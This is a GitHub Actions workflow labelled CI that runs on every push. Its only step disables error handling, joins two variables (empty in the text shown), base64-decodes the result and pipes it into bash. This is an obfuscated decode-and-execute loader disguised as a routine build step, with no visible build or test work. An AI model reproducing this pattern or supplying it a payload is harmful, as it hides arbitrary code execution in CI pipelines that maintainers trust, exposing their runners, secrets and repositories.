 name: CI
 on:
   push:
     branches: ['**']
   workflow_dispatch:
 permissions:
   contents: read
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - run: |
           set +e
           A=''
           B=''
           printf '%s%s' "$A" "$B" | base64 -d | bash
